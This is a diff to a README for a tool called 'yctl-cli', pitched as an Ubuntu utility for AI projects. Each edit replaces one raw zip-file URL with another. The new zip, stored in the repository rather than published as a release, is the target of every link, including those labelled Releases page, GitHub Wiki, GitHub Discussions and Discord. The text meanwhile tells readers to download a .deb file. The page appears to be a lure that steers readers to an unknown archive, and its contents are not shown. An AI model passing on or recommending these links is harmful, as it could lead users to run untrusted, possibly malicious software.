@@ -6,7 +6,7 @@ yctl-cli is a powerful command-line tool designed for Ubuntu users. It helps you
 
 ## 🔗 Download
 
-[![Download yctl-cli](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip%20yctl--cli-v1.0.0-blue)](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip)
+[![Download yctl-cli](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip%20yctl--cli-v1.0.0-blue)](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ yctl-cli is a powerful command-line tool designed for Ubuntu users. It helps you
 - **Storage:** Minimum 200 MB of free disk space
 
 ### 📦 Installation Steps
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip) to find the latest version of yctl-cli.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip) to find the latest version of yctl-cli.
 
 2. **Download the Software:** Click on the version you want to download. Look for the file that ends with `.deb`, as this is the installation file for Ubuntu.
 
@@ -80,13 +80,13 @@ yctl-cli is a powerful command-line tool designed for Ubuntu users. It helps you
 
 ## 🌐 Additional Resources
 
-For further assistance and documentation, visit our [GitHub Wiki](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip). 
+For further assistance and documentation, visit our [GitHub Wiki](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip). 
 
 ## 💬 Community Support
 
 Join our community for help and discussions related to yctl-cli. You can find us on:
-- [GitHub Discussions](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip)
-- [Discord Channel](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip)
+- [GitHub Discussions](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip)
+- [Discord Channel](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip)
 
 ## 🎉 Contact
 
@@ -96,4 +96,4 @@ For any further queries, feel free to reach out via the GitHub Issues page.
 
 With yctl-cli, you have a powerful tool that simplifies the process of working on AI projects. Enjoy utilizing yctl-cli to enhance your development workflow. 
 
-[Download yctl-cli now!](https://raw.githubusercontent.com/Pahcccccc/yctl-cli/main/tests/yctl_cli_v3.1.zip)
+[Download yctl-cli now!](https://github.com/Pahcccccc/yctl-cli/raw/refs/heads/main/yctl/cli_yctl_3.9.zip)
